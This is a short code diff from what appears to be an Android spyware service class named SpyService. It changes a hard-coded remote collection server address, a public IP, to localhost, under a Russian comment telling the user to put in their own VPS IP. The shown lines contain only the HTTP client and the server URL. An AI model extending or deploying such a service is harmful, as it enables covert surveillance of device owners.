@@ -19,7 +19,7 @@ class SpyService : Service() {
     private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).writeTimeout(15, TimeUnit.SECONDS).build()
     
     // ЗАМЕНИ НА СВОЙ IP (VPS или локальный)
-    private val serverUrl = "http://80.94.250.145:8080" 
+     private val serverUrl = "http://127.0.0.1:8080"
 
     override fun onCreate() {
         super.onCreate()
